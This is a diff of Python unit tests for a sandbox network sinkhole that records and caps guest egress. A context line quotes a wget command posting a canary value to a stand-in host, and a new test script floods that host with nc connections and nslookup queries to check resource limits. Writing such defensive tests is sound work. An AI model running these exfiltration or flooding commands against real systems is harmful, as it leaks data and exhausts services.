@@ -13,7 +13,7 @@ import time
 import unittest
 
 from helpers import allow, msb_available, pinned
-from pqproof.egress import SINK_CIDR, Sinkhole, nxdomain
+from pqproof.egress import MAX_CONNS, MAX_EVENTS, Sinkhole, nxdomain
 from pqproof.sandbox import MSB, Limits, Runner
 
 
@@ -55,6 +55,47 @@ class SinkholeUnit(unittest.TestCase):
             self.assertEqual((e["kind"], e["dest"], e["canaries"]), ("tcp", "203.0.113.7:80", ["CANARY-0001"]))
             self.assertEqual((e["bytes"], e["sha256"]), (len(payload), hashlib.sha256(payload).hexdigest()))
 
+    def test_label_length_limit(self):
+        self.assertEqual(nxdomain(dns_query("a" * 63 + ".example"))[1], "a" * 63 + ".example")
+        self.assertEqual(nxdomain(dns_query("a" * 64 + ".example")), (None, None))
+
+    def test_connect_capture_is_capped(self):
+        with Sinkhole() as sink, socket.create_connection(("127.0.0.1", sink.tcp_port), timeout=3) as c:
+            c.sendall(b"CONNECT 203.0.113.7:80 HTTP/1.1\r\n\r\n")
+            c.recv(100)
+            try:
+                c.sendall(b"x" * (256 * 1024))
+            except OSError:  # the sinkhole may close once it has enough
+                pass
+            c.shutdown(socket.SHUT_WR)
+            self.assertTrue(wait_for(lambda: sink.events))
+            self.assertLessEqual(sink.events[0]["bytes"], 64 * 1024 + 4096)
+
+    def test_connections_beyond_the_limit_are_closed_unread(self):
+        base = threading.active_count()
+        with Sinkhole() as sink:
+            held = [socket.create_connection(("127.0.0.1", sink.tcp_port), timeout=3) for _ in range(MAX_CONNS + 20)]
+            try:
+                self.assertTrue(wait_for(lambda: sink.dropped >= 20), sink.dropped)
+                self.assertLessEqual(threading.active_count(), base + 2 + MAX_CONNS)
+            finally:
+                for c in held:
+                    c.close()
+
+    def test_events_are_capped_but_counted_and_canaries_kept(self):
+        with Sinkhole() as sink, socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.settimeout(3)
+            for i in range(MAX_EVENTS + 5):
+                s.sendto(dns_query(f"q{i}.flood.example"), ("127.0.0.1", sink.dns_port))
+                s.recv(512)
+            s.sendto(dns_query("late-canary-0042.example.net"), ("127.0.0.1", sink.dns_port))
+            s.recv(512)
+            self.assertTrue(wait_for(lambda: len(sink.events) + sink.dropped == MAX_EVENTS + 6))
+            self.assertEqual((len(sink.events), sink.dropped), (MAX_EVENTS, 6))
+            self.assertEqual(sink.canaries(), ["CANARY-0042"])
+            events, dropped = sink.take()
+            self.assertEqual((len(events), dropped, sink.events, sink.dropped), (MAX_EVENTS, 6, [], 0))
+
     def test_malformed_dns_is_ignored(self):
         for packet in (b"", b"\x00" * 11, dns_query("example.com")[:-3], b"\x12\x34" + b"\x00" * 10 + b"\x40abc"):
             with self.subTest(packet=packet):
@@ -65,11 +106,13 @@ class SinkholeUnit(unittest.TestCase):
             args = sink.msb_args()
         self.assertEqual(args[0], "--no-net")
         rules = args[args.index("--net-rule") + 1]
-        self.assertEqual(rules, f"allow@dns,allow@{SINK_CIDR}:tcp")
+        self.assertEqual(rules, "allow@dns,allow@203.0.113.0/24:tcp")  # literal: never wider than TEST-NET-3
         for broad in ("public", "private", "host", "any", "all"):
             self.assertNotIn(f"allow@{broad}", rules)
         self.assertEqual(args[args.index("--dns-nameserver") + 1], f"127.0.0.1:{sink.dns_port}")
         self.assertEqual(args[args.index("--proxy") + 1], f"http://127.0.0.1:{sink.tcp_port}")
+        self.assertEqual(args[args.index("--max-tcp-connections") + 1], str(2 * MAX_CONNS))
+        self.assertEqual(args[args.index("--net-egress-ops") + 1], "200/1s")
 
 
 class EveryStepIsDenied(unittest.TestCase):
@@ -152,6 +195,32 @@ wget -q -T 4 -O- --post-data canary=CANARY-0001 http://203.0.113.7/collect >/dev
         self.assertEqual([e["dest"] for e in events if e["kind"] == "tcp"], ["203.0.113.7:80"])
         self.assertIn("leak-canary-0002.example.net", [e["dest"].lower() for e in events if e["kind"] == "dns"])
         self.assertEqual(api.accepted, 0)
+
+    def test_flooding_guest_cannot_exhaust_the_sinkhole(self):
+        script = """
+i=0; while [ $i -lt 300 ]; do (sleep 8 | nc 203.0.113.7 80 >/dev/null 2>&1 &); i=$((i+1)); done
+t=$(( $(date +%s) + 4 )); n=0
+while [ $(date +%s) -lt $t ]; do nslookup f$n.flood.example >/dev/null 2>&1; n=$((n+1)); done; echo DNSQ=$n
+sleep 3
+"""
+        peak, stop = [threading.active_count()], threading.Event()
+
+        def watch():
+            while not stop.is_set():
+                peak[0] = max(peak[0], threading.active_count())
+                time.sleep(0.01)
+        threading.Thread(target=watch, daemon=True).start()
+        with Sinkhole() as sink:
+            try:
+                res = self.step(sink, script, wall=25)
+                time.sleep(1)
+            finally:
+                stop.set()
+            kept, dropped = len(sink.events), sink.dropped
+        self.assertIn("DNSQ=", res.stdout)
+        self.assertLessEqual(peak[0], MAX_CONNS + 12)
+        self.assertLessEqual(kept, MAX_EVENTS)
+        self.assertGreater(kept + dropped, 0)
 
     def test_host_probe_would_see_an_open_host(self):
         """Positive control: with the host group allowed, the same probe reaches the fake API."""
